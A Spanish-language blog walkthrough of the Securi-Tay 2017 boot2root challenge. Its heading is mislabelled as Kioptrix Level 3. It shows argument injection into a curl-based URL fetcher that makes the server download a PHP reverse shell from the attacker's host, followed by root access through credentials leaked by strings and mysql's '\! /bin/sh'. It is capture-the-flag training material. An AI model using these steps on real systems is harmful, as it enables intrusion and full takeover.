<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="/static/img/favicon.ico" />
    <title>Securi-Tay 2017	PentesLimited  Boot2Root - Roskyfrosky Blog</title>
    <meta name="author" content="Roskyfrosky" />
    <meta name="description" content="Securi-Tay 2017	PentesLimited  Boot2Root" />
    <meta name="keywords" content="Securi-Tay 2017	PentesLimited  Boot2Root, Roskyfrosky Blog, pentestlimited" />
    <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml">
    <meta content="" property="fb:app_id">
    <meta content="Roskyfrosky Blog" property="og:site_name">

    

    
      <meta content="Securi-Tay 2017	PentesLimited  Boot2Root" property="og:title">
      <meta content="article" property="og:type">
    

    
      <meta content="This is my personal blog" property="og:description">
    

    
      <meta content="https://blog.roskyfrosky.com/pentestlimited/2017/05/08/Securi-tay-pentestlimited.html" property="og:url">
    

    
      <meta content="2017-05-08T08:11:34+01:00" property="article:published_time">
      <meta content="https://blog.roskyfrosky.com/about/" property="article:author">
    

    
      <meta content="https://blog.roskyfrosky.com/static/img/posts//images/avatares/pentestlimited1.png" property="og:image">
    

    
      
        <meta content="pentestlimited" property="article:section">
      
    

    
      
        <meta content="boot2root" property="article:tag">
      
        <meta content="pentestlimited" property="article:tag">
      
    

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@roskyfrosky">
    <meta name="twitter:creator" content="@roskyfrosky">

    
      <meta name="twitter:title" content="Securi-Tay 2017	PentesLimited  Boot2Root">
    

    
      <meta name="twitter:url" content="https://blog.roskyfrosky.com/pentestlimited/2017/05/08/Securi-tay-pentestlimited.html">
    

    
      <meta name="twitter:description" content="This is my personal blog">
    

    

    <!-- Font awesome icons -->
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">
    <!-- syntax highlighting CSS -->
    <link rel="stylesheet" href="/static/css/syntax.css">
    <!-- Bootstrap core CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,300italic,300,400italic,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css">
    <!-- Custom CSS -->
    <link rel="stylesheet" href="/static/css/super-search.css">
    <link rel="stylesheet" href="/static/css/thickbox.css">
    <link rel="stylesheet" href="/static/css/projects.css">
    <link rel="stylesheet" href="/static/css/main.css">

    
  </head>
  <body>
    <div class="container">
      <div class="col-sm-3">
        <div class="fixed-condition">
          <a href="/"><img class="profile-avatar" src="/static/img/avatar.jpg" height="75px" width="75px" /></a>
          <h1 class="author-name">Roskyfrosky</h1>
          
          <div class="social">
            <ul>
              
                <li><a href="https://twitter.com/roskyfrosky" target="_blank"><i class="fa fa-twitter"></i></a></li>
              
                <li><a href="https://github.com/roskyfrosky" target="_blank"><i class="fa fa-github"></i></a></li>
              
            </ul>
          </div>
          <div class="search" id="js-search">
            <input type="text" placeholder="(sitemap)~$ type to search" class="search__input form-control" id="js-search__input">
            <ul class="search__results" id="js-search__results"></ul>
          </div>
          <hr />
          <ul class="sidebar-nav">
            <strong>Navigation</strong>
            <li><a href="/">Home</a></li>
            
              <li><a class="about" href="/about/">About Me</a></li>
            
              <li><a class="about" href="/feed.xml">XML Feed</a></li>
            
          </ul>
        </div>
        <!-- end /.fixed-condition -->
      </div>
      <div class="col-sm-8 col-offset-1 main-layout">
        <header class="post-header">
  <h1 class="post-title">Securi-Tay 2017	PentesLimited  Boot2Root</h1>
</header>

<span class="time">08 May 2017</span>

  <span class="categories">
    &raquo; <a href="/category/pentestlimited">pentestlimited</a>
  </span>


<div class="content">
  <div class="post"><h1 id="kioptrix-level-3-boot2root-vulnhub">Kioptrix Level 3 Boot2Root Vulnhub</h1>
<p><strong>URL de la máquina:</strong> <a href="https://maze.pentest-challenge.co.uk/">https://maze.pentest-challenge.co.uk/</a><br />
<strong>Descripción:</strong></p>

<h2 id="solución">Solución</h2>

<p>En primer lugar, y como en todas las máquinas que estamos realizando, lo primero en realizar siempre es un escaneo de puertos de la máquina para comprobar que servicios están corriendo en ella.</p>

<p><img src="/images/PentestLimited/SecuriTay/escaneo.png" alt="" class="img-responsive" /></p>

<p>Vemos que el unico puerto que está abierto es el 80, por lo que vamos directos al navegador  a ver que nos encontramos.</p>

<p><img src="/images/PentestLimited/SecuriTay/home.png" alt="" class="img-responsive" /></p>

<p>Vemos que hay una caja en la cual te indica que puedes meter cualquier url que quieras probar.Trás una prueba rapida vemos que lo que hace es visitar la página que introduces, por lo que vamos a probar a ver que pasa si no introducimos ninguna URL.</p>

<p><img src="/images/PentestLimited/SecuriTay/curl.png" alt="" class="img-responsive" /></p>

<table>
  <tbody>
    <tr>
      <td>Al no meter ninguna URL nos indica que se está utilizando el comando CURL para realizar las peticiones a las páginas.Lo primero que intentamos es un command injection, pero vemos que algunos caracteres están filtrados como pueden ser ; , &amp; o</td>
      <td>.</td>
    </tr>
  </tbody>
</table>

<p><img src="/images/PentestLimited/SecuriTay/curl_chars.png" alt="" class="img-responsive" /></p>

<p>Dado que no podemos realizar un command injection lo siguiente que intentamos es realizar una peticion a un servidor que este bajo nuestro dominio para ver si podemos redirigir la salida de la peticion y crear ficheros en el servidor, pero nos aparece un error de que no tenemos permisos para escribir en el directorio actual. Por lo que vamos a ver si existe otro directorio donde podamos escribir.
Para ello lanzamos dirb con el diccionario common.txt y vemos que existe una carpeta que se llama uploads.</p>

<p><img src="/images/PentestLimited/SecuriTay/dirb.png" alt="" class="img-responsive" /></p>

<p>Vamos a ella a través del navegador y vemos que es donde se encuentra el fichero test.html que es el fichero de ejemplo que te aparece en el home al entrar a la página. Vamos a intentar descargar una reverse shell en el servidor para luego conectarnos a nuestra máquina.</p>

<p>Para ello vamos a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a> y descargamos el fichero de shell inversa en php.
Una vez descargado, configuramos el host y el puerto al que queremos que se conecte, en este caso la IP de mi máquina 192.168.1.37 y el puerto 4444.
Ahora levantamos un apache en nuestra máquina y ponemos ese fichero en la raíz para poder hacerle la peticiones mediante el curl, cambiando la extension de php a txt para que cuando se realize la peticion no se intente hacer la conexion inversa.</p>

<p>El comando que introducimos para hacer la peticiones es el siguiente</p>

<p><code class="highlighter-rouge">http://192.168.1.37/shell.txt -o uploads/shell.php</code></p>

<p>Una vez que tenemos el fichero en el servidor, ponemos un netcat a escuchar en nuestra máquina en el puerto 4444 y visitamos el fichero</p>

<p><img src="/images/PentestLimited/SecuriTay/revershell.png" alt="" class="img-responsive" /></p>

<p>Ya tenemos conexión inversa a la máquina!! :D.
Ahora vamos a ver si hay algún binario que nos interese en el servidor que tenga el bit suid activo.</p>

<p><img src="/images/PentestLimited/SecuriTay/find.png" alt="" class="img-responsive" /></p>

<p>Vemos que el binario de mysql tiene el bit suid activo, por lo que probamos a ver si hubiera la posibilidad de poder utilizarlo sin usuario ni contraseña, pero no es posible.
Entonces vamos al home del usuario y vemos un fichero con nombre “mydbconnchecker” cuyo usuario y grupo es root, además de que los permisos del fichero no nos permite leerlo.Pero nadie dijo que no le pudieramos hacer un strings al fichero</p>

<p><img src="/images/PentestLimited/SecuriTay/strings.png" alt="" class="img-responsive" /></p>

<p>En los strings del fichero vemos que hay una credenciales de acceso a mysql.
Las probamos y podemos acceder.Una vez logueados, mysql te permite la ejecucion de comando introduciendo ! al principio, por lo que nosotros vamos a invocar una shell:</p>

<p><code class="highlighter-rouge">\! /bin/sh</code></p>

<p>Y comprobamos que efectivamente se está ejecutando como usuario root.</p>

<p><img src="/images/PentestLimited/SecuriTay/root.png" alt="" class="img-responsive" /></p>

<p>Ahora solo queda entrar en el directorio /root y ver la flag.Al mostrar el contenido de flag.txt nos indica que debemos ejecutar el binario flag-gen introduciendo nuestro nombre como parámetro, ya que es un generador de flags.
<img src="/images/PentestLimited/SecuriTay/flag_rules.png" alt="" class="img-responsive" /></p>

<p>Introduciendo mi nombre como parámetro obtendría la siguiente flag.</p>

<p><img src="/images/PentestLimited/SecuriTay/flag.png" alt="" class="img-responsive" /></p>

</div>
  <div class="share-page">
  <span style="float: left;">Share this on &rarr;&nbsp;&nbsp;</span>

  <!-- Twitter -->
  <a href="https://twitter.com/share" class="twitter-share-button" data-via="roskyfrosky">Tweet</a>
  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>

  <!-- Google + -->
  <div class="g-plus" data-action="share" data-annotation="bubble"></div>
  <script src="https://apis.google.com/js/platform.js" async defer></script>

  <!-- Facebook -->
  <div class="fb-share-button" data-href="https://blog.roskyfrosky.com/pentestlimited/2017/05/08/Securi-tay-pentestlimited.html" data-layout="button_count" style="position: relative; top: -8px; left: 3px;"></div>
</div>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6&appId=";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

</div>


  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
    
      
        
          
      
    
  
  

<div class="PageNavigation">
  
    <a class="prev" href="/vulnhub/2017/04/20/Kioptrix3.0-vulnhub.html">&laquo; Kioptrix Level 3 (1.2) VulnHub Boot2Root</a>
  
  
    <a class="next" href="/vulnhub/2017/05/08/Hackfest-quaoar.html">Vulnhub HackFest Quaoar &raquo;</a>
  
</div>

<div class="disqus-comments">
  <div id="disqus_thread"></div>
  <script type="text/javascript">
    /* <![CDATA[ */
    var disqus_shortname = "roskyfrosky";
    var disqus_identifier = "https://blog.roskyfrosky.com_Securi-Tay 2017	PentesLimited  Boot2Root";
    var disqus_title = "Securi-Tay 2017	PentesLimited  Boot2Root";

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
    /* ]]> */
  </script>
</div>

        <footer>
          &copy; Roskyfrosky
          
            - <a href="https://github.com/roskyfrosky">https://github.com/roskyfrosky</a> - Powered by Jekyll.
          
        </footer>
      </div>
      <!-- end /.col-sm-8 -->
    </div>
    <!-- end /.container -->

    <!-- Bootstrap core JavaScript -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
    <script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
    <script src="/static/js/super-search.js"></script>
    <script src="/static/js/thickbox-compressed.js"></script>
    <script src="/static/js/projects.js"></script>
  </body>
</html>

